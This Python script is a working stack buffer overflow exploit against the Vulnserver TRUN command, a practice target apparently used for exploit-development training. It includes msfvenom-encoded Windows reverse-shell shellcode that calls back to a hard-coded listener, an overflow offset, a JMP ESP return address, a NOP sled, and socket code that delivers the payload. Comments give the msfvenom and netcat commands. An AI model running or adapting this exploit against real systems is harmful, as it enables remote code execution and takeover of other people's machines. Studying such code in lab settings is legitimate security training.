#!/usr/bin/python
import socket

#########################################################
### Vulnserver.exe TRUN command Stack Buffer Overflow ###
### Written by purpl3f0x                              ###
### Find more exploits at my github:                  ###
### https://github.com/purpl3-f0x                     ###
#########################################################

### *NOTE!!*: IP address is hard-coded below, this exploit does not accept arguments! ###

# Payload: Windows reverse tcp
# Command used to generate the payload:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=443 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b '\x00' EXITFUNC=thread
# Bad characters = x00

shellcode=("\xbe\x81\x10\x05\xbe\xdd\xc4\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xc7\x04\x31\x77\x0e\x03\xf6\x1e\xe7\x4b\x04\xf6\x65"
"\xb3\xf4\x07\x0a\x3d\x11\x36\x0a\x59\x52\x69\xba\x29\x36\x86"
"\x31\x7f\xa2\x1d\x37\xa8\xc5\x96\xf2\x8e\xe8\x27\xae\xf3\x6b"
"\xa4\xad\x27\x4b\x95\x7d\x3a\x8a\xd2\x60\xb7\xde\x8b\xef\x6a"
"\xce\xb8\xba\xb6\x65\xf2\x2b\xbf\x9a\x43\x4d\xee\x0d\xdf\x14"
"\x30\xac\x0c\x2d\x79\xb6\x51\x08\x33\x4d\xa1\xe6\xc2\x87\xfb"
"\x07\x68\xe6\x33\xfa\x70\x2f\xf3\xe5\x06\x59\x07\x9b\x10\x9e"
"\x75\x47\x94\x04\xdd\x0c\x0e\xe0\xdf\xc1\xc9\x63\xd3\xae\x9e"
"\x2b\xf0\x31\x72\x40\x0c\xb9\x75\x86\x84\xf9\x51\x02\xcc\x5a"
"\xfb\x13\xa8\x0d\x04\x43\x13\xf1\xa0\x08\xbe\xe6\xd8\x53\xd7"
"\xcb\xd0\x6b\x27\x44\x62\x18\x15\xcb\xd8\xb6\x15\x84\xc6\x41"
"\x59\xbf\xbf\xdd\xa4\x40\xc0\xf4\x62\x14\x90\x6e\x42\x15\x7b"
"\x6e\x6b\xc0\x2c\x3e\xc3\xbb\x8c\xee\xa3\x6b\x65\xe4\x2b\x53"
"\x95\x07\xe6\xfc\x3c\xf2\x61\xc3\x69\xfc\x63\xab\x6b\xfc\x82"
"\x90\xe5\x1a\xee\xf6\xa3\xb5\x87\x6f\xee\x4d\x39\x6f\x24\x28"
"\x79\xfb\xcb\xcd\x34\x0c\xa1\xdd\xa1\xfc\xfc\xbf\x64\x02\x2b"
"\xd7\xeb\x91\xb0\x27\x65\x8a\x6e\x70\x22\x7c\x67\x14\xde\x27"
"\xd1\x0a\x23\xb1\x1a\x8e\xf8\x02\xa4\x0f\x8c\x3f\x82\x1f\x48"
"\xbf\x8e\x4b\x04\x96\x58\x25\xe2\x40\x2b\x9f\xbc\x3f\xe5\x77"
"\x38\x0c\x36\x01\x45\x59\xc0\xed\xf4\x34\x95\x12\x38\xd1\x11"
"\x6b\x24\x41\xdd\xa6\xec\x61\x3c\x62\x19\x0a\x99\xe7\xa0\x57"
"\x1a\xd2\xe7\x61\x99\xd6\x97\x95\x81\x93\x92\xd2\x05\x48\xef"
"\x4b\xe0\x6e\x5c\x6b\x21")

# JMP ESP in essfunc.dll = x625011AF

buffer='A' * 2003 + '\xAF\x11\x50\x62' + '\x90' * 20 + shellcode


# Connect to target and send the attack
# Catch the shell with:
# nc -nvlp 443

try:
	print "Sending evil buffer, make sure you have netcat listening on 443!"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.0.7',9999))
	s.recv(1024)
	s.send('TRUN /.:/' + buffer)
	s.close()
	print "Buffer successfully delivered, check your netcat connection!"
except:
	print "Connection failed."
